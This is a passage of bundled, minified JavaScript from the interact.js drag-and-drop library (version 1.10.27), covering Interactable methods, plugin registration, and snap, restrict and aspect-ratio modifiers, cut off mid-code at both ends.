                      this._onOff(Pn.On, r, c, void 0, m);
                },
              },
              {
                key: "setPerAction",
                value: function (r, l) {
                  var c = this._defaults;
                  for (var d in l) {
                    var h = d,
                      g = this.options[r],
                      m = l[h];
                    "listeners" === h &&
                      this.updatePerActionListeners(r, g.listeners, m),
                      M.array(m)
                        ? (g[h] = At(m))
                        : M.plainObject(m)
                        ? ((g[h] = ae(g[h] || {}, go(m))),
                          M.object(c.perAction[h]) &&
                            "enabled" in c.perAction[h] &&
                            (g[h].enabled = !1 !== m.enabled))
                        : M.bool(m) && M.object(c.perAction[h])
                        ? (g[h].enabled = m)
                        : (g[h] = m);
                  }
                },
              },
              {
                key: "getRect",
                value: function (r) {
                  return (
                    (r = r || (M.element(this.target) ? this.target : null)),
                    M.string(this.target) &&
                      (r = r || this._context.querySelector(this.target)),
                    wt(r)
                  );
                },
              },
              {
                key: "rectChecker",
                value: function (r) {
                  var l = this;
                  return M.func(r)
                    ? ((this.getRect = function (c) {
                        var d = ae({}, r.apply(l, c));
                        return (
                          "width" in d ||
                            ((d.width = d.right - d.left),
                            (d.height = d.bottom - d.top)),
                          d
                        );
                      }),
                      this)
                    : null === r
                    ? (delete this.getRect, this)
                    : this.getRect;
                },
              },
              {
                key: "_backCompatOption",
                value: function (r, l) {
                  if (ho(l) || M.object(l)) {
                    for (var c in ((this.options[r] = l), this._actions.map))
                      this.options[c][r] = l;
                    return this;
                  }
                  return this.options[r];
                },
              },
              {
                key: "origin",
                value: function (r) {
                  return this._backCompatOption("origin", r);
                },
              },
              {
                key: "deltaSource",
                value: function (r) {
                  return "page" === r || "client" === r
                    ? ((this.options.deltaSource = r), this)
                    : this.options.deltaSource;
                },
              },
              {
                key: "getAllElements",
                value: function () {
                  var r = this.target;
                  return M.string(r)
                    ? Array.from(this._context.querySelectorAll(r))
                    : M.func(r) && r.getAllElements
                    ? r.getAllElements()
                    : M.element(r)
                    ? [r]
                    : [];
                },
              },
              {
                key: "context",
                value: function () {
                  return this._context;
                },
              },
              {
                key: "inContext",
                value: function (r) {
                  return (
                    this._context === r.ownerDocument || we(this._context, r)
                  );
                },
              },
              {
                key: "testIgnoreAllow",
                value: function (r, l, c) {
                  return (
                    !this.testIgnore(r.ignoreFrom, l, c) &&
                    this.testAllow(r.allowFrom, l, c)
                  );
                },
              },
              {
                key: "testAllow",
                value: function (r, l, c) {
                  return (
                    !r ||
                    (!!M.element(c) &&
                      (M.string(r) ? fo(c, r, l) : !!M.element(r) && we(r, c)))
                  );
                },
              },
              {
                key: "testIgnore",
                value: function (r, l, c) {
                  return (
                    !(!r || !M.element(c)) &&
                    (M.string(r) ? fo(c, r, l) : !!M.element(r) && we(r, c))
                  );
                },
              },
              {
                key: "fire",
                value: function (r) {
                  return this.events.fire(r), this;
                },
              },
              {
                key: "_onOff",
                value: function (r, l, c, d, h) {
                  M.object(l) && !M.array(l) && ((d = c), (c = null));
                  var g = F(l, c, h);
                  for (var m in g) {
                    "wheel" === m && (m = Z.wheelEvent);
                    for (var A = 0, P = g[m]; A < P.length; A++) {
                      var b = P[A];
                      ki(m, this._actions)
                        ? this.events[r === Pn.On ? "on" : "off"](m, b)
                        : M.string(this.target)
                        ? this._scopeEvents[
                            r === Pn.On ? "addDelegate" : "removeDelegate"
                          ](this.target, this._context, m, b, d)
                        : this._scopeEvents[r === Pn.On ? "add" : "remove"](
                            this.target,
                            m,
                            b,
                            d
                          );
                    }
                  }
                  return this;
                },
              },
              {
                key: "on",
                value: function (r, l, c) {
                  return this._onOff(Pn.On, r, l, c);
                },
              },
              {
                key: "off",
                value: function (r, l, c) {
                  return this._onOff(Pn.Off, r, l, c);
                },
              },
              {
                key: "set",
                value: function (r) {
                  var l = this._defaults;
                  for (var c in (M.object(r) || (r = {}),
                  (this.options = go(l.base)),
                  this._actions.methodDict)) {
                    var d = c,
                      h = this._actions.methodDict[d];
                    (this.options[d] = {}),
                      this.setPerAction(
                        d,
                        ae(ae({}, l.perAction), l.actions[d])
                      ),
                      this[h](r[d]);
                  }
                  for (var g in r)
                    "getRect" !== g
                      ? M.func(this[g]) && this[g](r[g])
                      : this.rectChecker(r.getRect);
                  return this;
                },
              },
              {
                key: "unset",
                value: function () {
                  if (M.string(this.target))
                    for (var r in this._scopeEvents.delegatedEvents)
                      for (
                        var l = this._scopeEvents.delegatedEvents[r],
                          c = l.length - 1;
                        c >= 0;
                        c--
                      ) {
                        var d = l[c],
                          h = d.selector,
                          g = d.context,
                          m = d.listeners;
                        h === this.target &&
                          g === this._context &&
                          l.splice(c, 1);
                        for (var A = m.length - 1; A >= 0; A--)
                          this._scopeEvents.removeDelegate(
                            this.target,
                            this._context,
                            r,
                            m[A][0],
                            m[A][1]
                          );
                      }
                  else this._scopeEvents.remove(this.target, "all");
                },
              },
            ]),
            s
          );
        })(),
        qh = (function () {
          function s(r) {
            var l = this;
            a(this, s),
              (this.list = []),
              (this.selectorMap = {}),
              (this.scope = void 0),
              (this.scope = r),
              r.addListeners({
                "interactable:unset": function (c) {
                  var d = c.interactable,
                    h = d.target,
                    g = M.string(h) ? l.selectorMap[h] : h[l.scope.id],
                    m = bn(g, function (A) {
                      return A === d;
                    });
                  g.splice(m, 1);
                },
              });
          }
          return (
            f(s, [
              {
                key: "new",
                value: function (r, l) {
                  l = ae(l || {}, { actions: this.scope.actions });
                  var c = new this.scope.Interactable(
                    r,
                    l,
                    this.scope.document,
                    this.scope.events
                  );
                  return (
                    this.scope.addDocument(c._doc),
                    this.list.push(c),
                    M.string(r)
                      ? (this.selectorMap[r] || (this.selectorMap[r] = []),
                        this.selectorMap[r].push(c))
                      : (c.target[this.scope.id] ||
                          Object.defineProperty(r, this.scope.id, {
                            value: [],
                            configurable: !0,
                          }),
                        r[this.scope.id].push(c)),
                    this.scope.fire("interactable:new", {
                      target: r,
                      options: l,
                      interactable: c,
                      win: this.scope._win,
                    }),
                    c
                  );
                },
              },
              {
                key: "getExisting",
                value: function (r, l) {
                  var c = (l && l.context) || this.scope.document,
                    d = M.string(r),
                    h = d ? this.selectorMap[r] : r[this.scope.id];
                  if (h)
                    return zo(h, function (g) {
                      return g._context === c && (d || g.inContext(r));
                    });
                },
              },
              {
                key: "forEachMatch",
                value: function (r, l) {
                  for (var c = 0, d = this.list; c < d.length; c++) {
                    var h = d[c],
                      g = void 0;
                    if (
                      ((M.string(h.target)
                        ? M.element(r) && vt(r, h.target)
                        : r === h.target) &&
                        h.inContext(r) &&
                        (g = l(h)),
                      void 0 !== g)
                    )
                      return g;
                  }
                },
              },
            ]),
            s
          );
        })(),
        Kh = (function () {
          function s() {
            var c,
              d,
              r = this;
            a(this, s),
              (this.id = "__interact_scope_".concat(
                Math.floor(100 * Math.random())
              )),
              (this.isInitialized = !1),
              (this.listenerMaps = []),
              (this.browser = Z),
              (this.defaults = go(Ll)),
              (this.Eventable = Hl),
              (this.actions = {
                map: {},
                phases: { start: !0, move: !0, end: !0 },
                methodDict: {},
                phaselessTypes: {},
              }),
              (this.interactStatic =
                ((c = this),
                ((d = function h(g, m) {
                  var A = c.interactables.getExisting(g, m);
                  return (
                    A ||
                      ((A = c.interactables.new(g, m)).events.global =
                        h.globalEvents),
                    A
                  );
                }).getPointerAverage = Be),
                (d.getTouchBBox = Xe),
                (d.getTouchDistance = ct),
                (d.getTouchAngle = Yt),
                (d.getElementRect = wt),
                (d.getElementClientRect = Bo),
                (d.matchesSelector = vt),
                (d.closest = ue),
                (d.globalEvents = {}),
                (d.version = "1.10.27"),
                (d.scope = c),
                (d.use = function (h, g) {
                  return this.scope.usePlugin(h, g), this;
                }),
                (d.isSet = function (h, g) {
                  return !!this.scope.interactables.get(h, g && g.context);
                }),
                (d.on = Yo(function (h, g, m) {
                  if (
                    (M.string(h) &&
                      -1 !== h.search(" ") &&
                      (h = h.trim().split(/ +/)),
                    M.array(h))
                  ) {
                    for (var A = 0, P = h; A < P.length; A++) {
                      var b = P[A];
                      this.on(b, g, m);
                    }
                    return this;
                  }
                  if (M.object(h)) {
                    for (var T in h) this.on(T, h[T], g);
                    return this;
                  }
                  return (
                    ki(h, this.scope.actions)
                      ? this.globalEvents[h]
                        ? this.globalEvents[h].push(g)
                        : (this.globalEvents[h] = [g])
                      : this.scope.events.add(this.scope.document, h, g, {
                          options: m,
                        }),
                    this
                  );
                }, "The interact.on() method is being deprecated")),
                (d.off = Yo(function (h, g, m) {
                  if (
                    (M.string(h) &&
                      -1 !== h.search(" ") &&
                      (h = h.trim().split(/ +/)),
                    M.array(h))
                  ) {
                    for (var A = 0, P = h; A < P.length; A++) {
                      var b = P[A];
                      this.off(b, g, m);
                    }
                    return this;
                  }
                  if (M.object(h)) {
                    for (var T in h) this.off(T, h[T], g);
                    return this;
                  }
                  var O;
                  return (
                    ki(h, this.scope.actions)
                      ? h in this.globalEvents &&
                        -1 !== (O = this.globalEvents[h].indexOf(g)) &&
                        this.globalEvents[h].splice(O, 1)
                      : this.scope.events.remove(this.scope.document, h, g, m),
                    this
                  );
                }, "The interact.off() method is being deprecated")),
                (d.debug = function () {
                  return this.scope;
                }),
                (d.supportsTouch = function () {
                  return Z.supportsTouch;
                }),
                (d.supportsPointerEvent = function () {
                  return Z.supportsPointerEvent;
                }),
                (d.stop = function () {
                  for (
                    var h = 0, g = this.scope.interactions.list;
                    h < g.length;
                    h++
                  )
                    g[h].stop();
                  return this;
                }),
                (d.pointerMoveTolerance = function (h) {
                  return M.number(h)
                    ? ((this.scope.interactions.pointerMoveTolerance = h), this)
                    : this.scope.interactions.pointerMoveTolerance;
                }),
                (d.addDocument = function (h, g) {
                  this.scope.addDocument(h, g);
                }),
                (d.removeDocument = function (h) {
                  this.scope.removeDocument(h);
                }),
                d)),
              (this.InteractEvent = vs),
              (this.Interactable = void 0),
              (this.interactables = new qh(this)),
              (this._win = void 0),
              (this.document = void 0),
              (this.window = void 0),
              (this.documents = []),
              (this._plugins = { list: [], map: {} }),
              (this.onWindowUnload = function (c) {
                return r.removeDocument(c.target);
              });
            var l = this;
            this.Interactable = (function (c) {
              v(h, c);
              var d = k(h);
              function h() {
                return a(this, h), d.apply(this, arguments);
              }
              return (
                f(h, [
                  {
                    key: "_defaults",
                    get: function () {
                      return l.defaults;
                    },
                  },
                  {
                    key: "set",
                    value: function (g) {
                      return (
                        D(y(h.prototype), "set", this).call(this, g),
                        l.fire("interactable:set", {
                          options: g,
                          interactable: this,
                        }),
                        this
                      );
                    },
                  },
                  {
                    key: "unset",
                    value: function () {
                      D(y(h.prototype), "unset", this).call(this);
                      var g = l.interactables.list.indexOf(this);
                      g < 0 ||
                        (l.interactables.list.splice(g, 1),
                        l.fire("interactable:unset", { interactable: this }));
                    },
                  },
                ]),
                h
              );
            })(Zh);
          }
          return (
            f(s, [
              {
                key: "addListeners",
                value: function (r, l) {
                  this.listenerMaps.push({ id: l, map: r });
                },
              },
              {
                key: "fire",
                value: function (r, l) {
                  for (var c = 0, d = this.listenerMaps; c < d.length; c++) {
                    var h = d[c].map[r];
                    if (h && !1 === h(l, this, r)) return !1;
                  }
                },
              },
              {
                key: "init",
                value: function (r) {
                  return this.isInitialized
                    ? this
                    : ((c = r),
                      ((l = this).isInitialized = !0),
                      M.window(c) && E(c),
                      Oe.init(c),
                      Z.init(c),
                      _n.init(c),
                      (l.window = c),
                      (l.document = c.document),
                      l.usePlugin(Xh),
                      l.usePlugin(Hh),
                      l);
                  var l, c;
                },
              },
              {
                key: "pluginIsInstalled",
                value: function (r) {
                  var l = r.id;
                  return l
                    ? !!this._plugins.map[l]
                    : -1 !== this._plugins.list.indexOf(r);
                },
              },
              {
                key: "usePlugin",
                value: function (r, l) {
                  if (!this.isInitialized) return this;
                  if (this.pluginIsInstalled(r)) return this;
                  if (
                    (r.id && (this._plugins.map[r.id] = r),
                    this._plugins.list.push(r),
                    r.install && r.install(this, l),
                    r.listeners && r.before)
                  ) {
                    for (
                      var c = 0,
                        d = this.listenerMaps.length,
                        h = r.before.reduce(function (m, A) {
                          return (m[A] = !0), (m[Zl(A)] = !0), m;
                        }, {});
                      c < d;
                      c++
                    ) {
                      var g = this.listenerMaps[c].id;
                      if (g && (h[g] || h[Zl(g)])) break;
                    }
                    this.listenerMaps.splice(c, 0, {
                      id: r.id,
                      map: r.listeners,
                    });
                  } else
                    r.listeners &&
                      this.listenerMaps.push({ id: r.id, map: r.listeners });
                  return this;
                },
              },
              {
                key: "addDocument",
                value: function (r, l) {
                  if (-1 !== this.getDocIndex(r)) return !1;
                  var c = C(r);
                  (l = l ? ae({}, l) : {}),
                    this.documents.push({ doc: r, options: l }),
                    this.events.documents.push(r),
                    r !== this.document &&
                      this.events.add(c, "unload", this.onWindowUnload),
                    this.fire("scope:add-document", {
                      doc: r,
                      window: c,
                      scope: this,
                      options: l,
                    });
                },
              },
              {
                key: "removeDocument",
                value: function (r) {
                  var l = this.getDocIndex(r),
                    c = C(r),
                    d = this.documents[l].options;
                  this.events.remove(c, "unload", this.onWindowUnload),
                    this.documents.splice(l, 1),
                    this.events.documents.splice(l, 1),
                    this.fire("scope:remove-document", {
                      doc: r,
                      window: c,
                      scope: this,
                      options: d,
                    });
                },
              },
              {
                key: "getDocIndex",
                value: function (r) {
                  for (var l = 0; l < this.documents.length; l++)
                    if (this.documents[l].doc === r) return l;
                  return -1;
                },
              },
              {
                key: "getDocOptions",
                value: function (r) {
                  var l = this.getDocIndex(r);
                  return -1 === l ? null : this.documents[l].options;
                },
              },
              {
                key: "now",
                value: function () {
                  return (this.window.Date || Date).now();
                },
              },
            ]),
            s
          );
        })();
      function Zl(s) {
        return s && s.replace(/\/.*$/, "");
      }
      var ql = new Kh(),
        ut = ql.interactStatic,
        $h = typeof globalThis < "u" ? globalThis : window;
      ql.init($h);
      var ep = Object.freeze({
          __proto__: null,
          edgeTarget: function () {},
          elements: function () {},
          grid: function (s) {
            var r = [
                ["x", "y"],
                ["left", "top"],
                ["right", "bottom"],
                ["width", "height"],
              ].filter(function (c) {
                var d = c[0],
                  h = c[1];
                return d in s || h in s;
              }),
              l = function (c, d) {
                for (
                  var h = s.range,
                    g = s.limits,
                    m =
                      void 0 === g
                        ? {
                            left: -1 / 0,
                            right: 1 / 0,
                            top: -1 / 0,
                            bottom: 1 / 0,
                          }
                        : g,
                    A = s.offset,
                    P = void 0 === A ? { x: 0, y: 0 } : A,
                    b = { range: h, grid: s, x: null, y: null },
                    T = 0;
                  T < r.length;
                  T++
                ) {
                  var O = r[T],
                    J = O[0],
                    N = O[1],
                    H = Math.round((c - P.x) / s[J]),
                    re = Math.round((d - P.y) / s[N]);
                  (b[J] = Math.max(m.left, Math.min(m.right, H * s[J] + P.x))),
                    (b[N] = Math.max(
                      m.top,
                      Math.min(m.bottom, re * s[N] + P.y)
                    ));
                }
                return b;
              };
            return (l.grid = s), (l.coordFields = r), l;
          },
        }),
        np = {
          id: "snappers",
          install: function (s) {
            var r = s.interactStatic;
            (r.snappers = ae(r.snappers || {}, ep)),
              (r.createSnapGrid = r.snappers.grid);
          },
        },
        op = {
          start: function (s) {
            var r = s.state,
              l = s.rect,
              c = s.edges,
              d = s.pageCoords,
              h = r.options,
              g = h.ratio,
              m = h.enabled,
              A = r.options,
              P = A.equalDelta,
              b = A.modifiers;
            "preserve" === g && (g = l.width / l.height),
              (r.startCoords = ae({}, d)),
              (r.startRect = ae({}, l)),
              (r.ratio = g),
              (r.equalDelta = P);
            var T = (r.linkedEdges = {
              top: c.top || (c.left && !c.bottom),
              left: c.left || (c.top && !c.right),
              bottom: c.bottom || (c.right && !c.top),
              right: c.right || (c.bottom && !c.left),
            });
            if (((r.xIsPrimaryAxis = !(!c.left && !c.right)), r.equalDelta)) {
              var O = (T.left ? 1 : -1) * (T.top ? 1 : -1);
              r.edgeSign = { x: O, y: O };
            } else r.edgeSign = { x: T.left ? -1 : 1, y: T.top ? -1 : 1 };
            if ((!1 !== m && ae(c, T), null != b && b.length)) {
              var J = new ms(s.interaction);
              J.copyFrom(s.interaction.modification),
                J.prepareStates(b),
                (r.subModification = J),
                J.startAll(o({}, s));
            }
          },
          set: function (s) {
            var r = s.state,
              l = s.rect,
              c = s.coords,
              d = r.linkedEdges,
              h = ae({}, c),
              g = r.equalDelta ? ip : rp;
            if (
              (ae(s.edges, d), g(r, r.xIsPrimaryAxis, c, l), !r.subModification)
            )
              return null;
            var m = ae({}, l);
            S(d, m, { x: c.x - h.x, y: c.y - h.y });
            var A = r.subModification.setAll(
                o(
                  o({}, s),
                  {},
                  {
                    rect: m,
                    edges: d,
                    pageCoords: c,
                    prevCoords: c,
                    prevRect: m,
                  }
                )
              ),
              P = A.delta;
            return (
              A.changed &&
                (g(r, Math.abs(P.x) > Math.abs(P.y), A.coords, A.rect),
                ae(c, A.coords)),
              A.eventProps
            );
          },
          defaults: {
            ratio: "preserve",
            equalDelta: !1,
            modifiers: [],
            enabled: !1,
          },
        };
      function ip(s, r, l) {
        var c = s.startCoords,
          d = s.edgeSign;
        r ? (l.y = c.y + (l.x - c.x) * d.y) : (l.x = c.x + (l.y - c.y) * d.x);
      }
      function rp(s, r, l, c) {
        var d = s.startRect,
          h = s.startCoords,
          g = s.ratio,
          m = s.edgeSign;
        if (r) {
          var A = c.width / g;
          l.y = h.y + (A - d.height) * m.y;
        } else {
          var P = c.height * g;
          l.x = h.x + (P - d.width) * m.x;
        }
      }
      var sp = xn(op, "aspectRatio"),
        Kl = function () {};
      Kl._defaults = {};
      var Oi = Kl;
      function Qn(s, r, l) {
        return M.func(s)
          ? en(s, r.interactable, r.element, [l.x, l.y, r])
          : en(s, r.interactable, r.element);
      }
      var Ri = {
          start: function (s) {
            var r = s.rect,
              l = s.startOffset,
              c = s.state,
              d = s.interaction,
              h = s.pageCoords,
              g = c.options,
              m = g.elementRect,
              A = ae({ left: 0, top: 0, right: 0, bottom: 0 }, g.offset || {});
            if (r && m) {
              var P = Qn(g.restriction, d, h);
              if (P) {
                var b = P.right - P.left - r.width,
                  T = P.bottom - P.top - r.height;
                b < 0 && ((A.left += b), (A.right += b)),
                  T < 0 && ((A.top += T), (A.bottom += T));
              }
              (A.left += l.left - r.width * m.left),
                (A.top += l.top - r.height * m.top),
                (A.right += l.right - r.width * (1 - m.right)),
                (A.bottom += l.bottom - r.height * (1 - m.bottom));
            }
            c.offset = A;
          },
          set: function (s) {
            var A,
              r = s.coords,
              l = s.interaction,
              c = s.state,
              d = c.options,
              h = c.offset,
              g = Qn(d.restriction, l, r);
            if (g) {
              var m =
                (!(A = g) ||
                  ("left" in A && "top" in A) ||
                  (((A = ae({}, A)).left = A.x || 0),
                  (A.top = A.y || 0),
                  (A.right = A.right || A.left + A.width),
                  (A.bottom = A.bottom || A.top + A.height)),
                A);
              (r.x = Math.max(
                Math.min(m.right - h.right, r.x),
                m.left + h.left
              )),
                (r.y = Math.max(
                  Math.min(m.bottom - h.bottom, r.y),
                  m.top + h.top
                ));
            }
          },
          defaults: {
            restriction: null,
            elementRect: null,
            offset: null,
            endOnly: !1,
            enabled: !1,
          },
        },
        ap = xn(Ri, "restrict"),
        $l = { top: 1 / 0, left: 1 / 0, bottom: -1 / 0, right: -1 / 0 },
        ec = { top: -1 / 0, left: -1 / 0, bottom: 1 / 0, right: 1 / 0 };
      function tc(s, r) {
        for (
          var l = 0, c = ["top", "left", "bottom", "right"];
          l < c.length;
          l++
        ) {
          var d = c[l];
          d in s || (s[d] = r[d]);
        }
        return s;
      }
      var Vo = {
          noInner: $l,
          noOuter: ec,
          start: function (s) {
            var r,
              l = s.interaction,
              c = s.startOffset,
              d = s.state,
              h = d.options;
            h && (r = wn(Qn(h.offset, l, l.coords.start.page))),
              (r = r || { x: 0, y: 0 }),
              (d.offset = {
                top: r.y + c.top,
                left: r.x + c.left,
                bottom: r.y - c.bottom,
                right: r.x - c.right,
              });
          },
          set: function (s) {
            var r = s.coords,
              l = s.edges,
              c = s.interaction,
              d = s.state,
              h = d.offset,
              g = d.options;
            if (l) {
              var m = ae({}, r),
                A = Qn(g.inner, c, m) || {},
                P = Qn(g.outer, c, m) || {};
              tc(A, $l),
                tc(P, ec),
                l.top
                  ? (r.y = Math.min(
                      Math.max(P.top + h.top, m.y),
                      A.top + h.top
                    ))
                  : l.bottom &&
                    (r.y = Math.max(
                      Math.min(P.bottom + h.bottom, m.y),
                      A.bottom + h.bottom
                    )),
                l.left
                  ? (r.x = Math.min(
                      Math.max(P.left + h.left, m.x),
                      A.left + h.left
                    ))
                  : l.right &&
                    (r.x = Math.max(
                      Math.min(P.right + h.right, m.x),
                      A.right + h.right
                    ));
            }
          },
          defaults: {
            inner: null,
            outer: null,
            offset: null,
            endOnly: !1,
            enabled: !1,
          },
        },
        lp = xn(Vo, "restrictEdges"),
        cp = ae(
          {
            get elementRect() {
              return { top: 0, left: 0, bottom: 1, right: 1 };
            },
            set elementRect(s) {},
          },
          Ri.defaults
        ),
        up = xn({ start: Ri.start, set: Ri.set, defaults: cp }, "restrictRect"),
        dp = { width: -1 / 0, height: -1 / 0 },
        fp = { width: 1 / 0, height: 1 / 0 },
        hp = xn(
          {
            start: function (s) {
              return Vo.start(s);
            },
            set: function (s) {
              var r = s.interaction,
                l = s.state,
                c = s.rect,
                d = s.edges,
                h = l.options;
              if (d) {
                var g = _(Qn(h.min, r, s.coords)) || dp,
                  m = _(Qn(h.max, r, s.coords)) || fp;
                (l.options = {
                  endOnly: h.endOnly,
                  inner: ae({}, Vo.noInner),
                  outer: ae({}, Vo.noOuter),
                }),
                  d.top
                    ? ((l.options.inner.top = c.bottom - g.height),
                      (l.options.outer.top = c.bottom - m.height))
                    : d.bottom &&
                      ((l.options.inner.bottom = c.top + g.height),
                      (l.options.outer.bottom = c.top + m.height)),
                  d.left
                    ? ((l.options.inner.left = c.right - g.width),
                      (l.options.outer.left = c.right - m.width))
                    : d.right &&
                      ((l.options.inner.right = c.left + g.width),
                      (l.options.outer.right = c.left + m.width)),
                  Vo.set(s),
                  (l.options = h);
              }
            },
            defaults: { min: null, max: null, endOnly: !1, enabled: !1 },
          },
          "restrictSize"
        ),
        _s = {
          start: function (s) {
            var r,
              O,
              J,
              l = s.interaction,
              c = s.interactable,
              d = s.element,
              h = s.rect,
              g = s.state,
              m = s.startOffset,
              A = g.options,
              P = A.offsetWithOrigin
                ? ((J = (O = s).interaction.element),
                  wn(en(O.state.options.origin, null, null, [J])) ||
                    R(O.interactable, J, O.interaction.prepared.name))
                : { x: 0, y: 0 };
            if ("startCoords" === A.offset)
              r = { x: l.coords.start.page.x, y: l.coords.start.page.y };
            else {
              var b = en(A.offset, c, d, [l]);
              ((r = wn(b) || { x: 0, y: 0 }).x += P.x), (r.y += P.y);
            }
            var T = A.relativePoints;
            g.offsets =
              h && T && T.length
                ? T.map(function (O, J) {
                    return {
                      index: J,
                      relativePoint: O,
                      x: m.left - h.width * O.x + r.x,
                      y: m.top - h.height * O.y + r.y,
                    };
                  })
                : [{ index: 0, relativePoint: null, x: r.x, y: r.y }];
          },
          set: function (s) {
            var r = s.interaction,
              l = s.coords,
              c = s.state,
              d = c.options,
              h = c.offsets,
              g = R(r.interactable, r.element, r.prepared.name),
              m = ae({}, l),
              A = [];
            d.offsetWithOrigin || ((m.x -= g.x), (m.y -= g.y));
            for (var P = 0, b = h; P < b.length; P++)
              for (
                var T = b[P],
                  O = m.x - T.x,
                  J = m.y - T.y,
                  N = 0,
                  H = d.targets.length;
                N < H;
                N++
              ) {
                var re = d.targets[N],
                  ne = void 0;
                (ne = M.func(re) ? re(O, J, r._proxy, T, N) : re) &&
                  A.push({
                    x: (M.number(ne.x) ? ne.x : O) + T.x,
                    y: (M.number(ne.y) ? ne.y : J) + T.y,
                    range: M.number(ne.range) ? ne.range : d.range,
                    source: re,
                    index: N,
                    offset: T,
                  });
              }
            for (
              var ce = {
                  target: null,
                  inRange: !1,
                  distance: 0,
                  range: 0,
                  delta: { x: 0, y: 0 },
                },
                be = 0;
              be < A.length;
              be++
            ) {
              var ke = A[be],
                ge = ke.range,
                _e = ke.x - m.x,
                dt = ke.y - m.y,
                He = Q(_e, dt),
                bt = He <= ge;
              ge === 1 / 0 && ce.inRange && ce.range !== 1 / 0 && (bt = !1),
                (ce.target &&
                  !(bt
                    ? ce.inRange && ge !== 1 / 0
                      ? He / ge < ce.distance / ce.range
                      : (ge === 1 / 0 && ce.range !== 1 / 0) || He < ce.distance
                    : !ce.inRange && He < ce.distance)) ||
                  ((ce.target = ke),
                  (ce.distance = He),
                  (ce.range = ge),
                  (ce.inRange = bt),
                  (ce.delta.x = _e),
                  (ce.delta.y = dt));
            }
            return (
              ce.inRange && ((l.x = ce.target.x), (l.y = ce.target.y)),
              (c.closest = ce),
              ce
            );
          },
          defaults: {
            range: 1 / 0,
            targets: null,
            offset: null,
            offsetWithOrigin: !0,
            origin: null,
            relativePoints: null,
            endOnly: !1,
            enabled: !1,
          },
        },
        pp = xn(_s, "snap"),
        Ci = {
          start: function (s) {
            var r = s.state,
              l = s.edges,
              c = r.options;
            if (!l) return null;
            (s.state = {
              options: {
                targets: null,
                relativePoints: [{ x: l.left ? 0 : 1, y: l.top ? 0 : 1 }],
                offset: c.offset || "self",
                origin: { x: 0, y: 0 },
                range: c.range,
              },
            }),
              (r.targetFields = r.targetFields || [
                ["width", "height"],
                ["x", "y"],
              ]),
              _s.start(s),
              (r.offsets = s.state.offsets),
              (s.state = r);
          },
          set: function (s) {
            var r = s.interaction,
              l = s.state,
              c = s.coords,
              d = l.options,
              h = l.offsets,
              g = { x: c.x - h[0].x, y: c.y - h[0].y };
            (l.options = ae({}, d)), (l.options.targets = []);
            for (var m = 0, A = d.targets || []; m < A.length; m++) {
              var P = A[m],
                b = void 0;
              if ((b = M.func(P) ? P(g.x, g.y, r) : P)) {
                for (var T = 0, O = l.targetFields; T < O.length; T++) {
                  var J = O[T],
                    N = J[0],
                    H = J[1];
                  if (N in b || H in b) {
                    (b.x = b[N]), (b.y = b[H]);
                    break;
                  }
                }
                l.options.targets.push(b);
              }
            }
            var re = _s.set(s);
            return (l.options = d), re;
          },
          defaults: {
            range: 1 / 0,
            targets: null,
            offset: null,
            endOnly: !1,
            enabled: !1,
          },
        },
        gp = xn(Ci, "snapSize"),
        xs = {
          aspectRatio: sp,
          restrictEdges: lp,
          restrict: ap,
          restrictRect: up,
          restrictSize: hp,
          snapEdges: xn(
            {
              start: function (s) {
                var r = s.edges;
                return r
                  ? ((s.state.targetFields = s.state.targetFields || [
                      [r.left ? "left" : "right", r.top ? "top" : "bottom"],
                    ]),
                    Ci.start(s))
                  : null;
              },
              set: Ci.set,
              defaults: ae(go(Ci.defaults), {
                targets: void 0,
                range: void 0,
                offset: { x: 0, y: 0 },
              }),
            },
            "snapEdges"
          ),
          snap: pp,
          snapSize: gp,
          spring: Oi,
          avoid: Oi,
          transform: Oi,
          rubberband: Oi,
        },
        vp = {
          id: "modifiers",
          install: function (s) {
            var r = s.interactStatic;
            for (var l in (s.usePlugin(Fl),
            s.usePlugin(np),
            (r.modifiers = xs),
            xs)) {
              var c = xs[l],
                d = c._defaults,
                h = c._methods;
              (d._methods = h), (s.defaults.perAction[l] = d);
            }
          },
        },
        nc = (function (s) {
          v(l, s);
          var r = k(l);
          function l(c, d, h, g, m, A) {
            var P;
            if (
              (a(this, l),
              V(x((P = r.call(this, m))), h),
              h !== d && V(x(P), d),
              (P.timeStamp = A),
              (P.originalEvent = h),
              (P.type = c),
              (P.pointerId = he(d)),
              (P.pointerType = Jo(d)),
              (P.target = g),
              (P.currentTarget = null),
              "tap" === c)
            ) {
              var b = m.getPointerIndex(d);
              P.dt = P.timeStamp - m.pointers[b].downTime;
              var T = P.timeStamp - m.tapTime;
              P.double =
                !!m.prevTap &&
                "doubletap" !== m.prevTap.type &&
                m.prevTap.target === P.target &&
                T < 500;
            } else
              "doubletap" === c &&
                ((P.dt = d.timeStamp - m.tapTime), (P.double = !0));
            return P;
          }
          return (
            f(l, [
              {
                key: "_subtractOrigin",
                value: function (c) {
                  var d = c.x,
                    h = c.y;
                  return (
                    (this.pageX -= d),
                    (this.pageY -= h),
                    (this.clientX -= d),
                    (this.clientY -= h),
                    this
                  );
                },
              },
              {
                key: "_addOrigin",
                value: function (c) {
                  var d = c.x,
                    h = c.y;
                  return (
                    (this.pageX += d),
                    (this.pageY += h),
                    (this.clientX += d),
                    (this.clientY += h),
                    this
                  );
                },
              },
              {
                key: "preventDefault",
                value: function () {
                  this.originalEvent.preventDefault();
                },
              },
            ]),
            l
          );
        })(Hn),
        Qo = {
          id: "pointer-events/base",
          before: ["inertia", "modifiers", "auto-start", "actions"],
          install: function (s) {
            (s.pointerEvents = Qo),
              (s.defaults.actions.pointerEvents = Qo.defaults),
              ae(s.actions.phaselessTypes, Qo.types);
          },
          listeners: {
            "interactions:new": function (s) {
              var r = s.interaction;
              (r.prevTap = null), (r.tapTime = 0);
            },
            "interactions:update-pointer": function (s) {
              var r = s.down,
                l = s.pointerInfo;
              (!r && l.hold) || (l.hold = { duration: 1 / 0, timeout: null });
            },
            "interactions:move": function (s, r) {
              var l = s.interaction,
                c = s.pointer,
                d = s.event,
                h = s.eventTarget;
              s.duplicate ||
                (l.pointerIsDown && !l.pointerWasMoved) ||
                (l.pointerIsDown && Ps(s),
                Mn(
                  {
                    interaction: l,
                    pointer: c,
                    event: d,
                    eventTarget: h,
                    type: "move",
                  },
                  r
                ));
            },
            "interactions:down": function (s, r) {
              (function (l, c) {
                for (
                  var d = l.interaction,
                    h = l.pointer,
                    g = l.event,
                    m = l.eventTarget,
                    A = l.pointerIndex,
                    P = d.pointers[A].hold,
                    b = Un(m),
                    T = {
                      interaction: d,
                      pointer: h,
                      event: g,
                      eventTarget: m,
                      type: "hold",
                      targets: [],
                      path: b,
                      node: null,
                    },
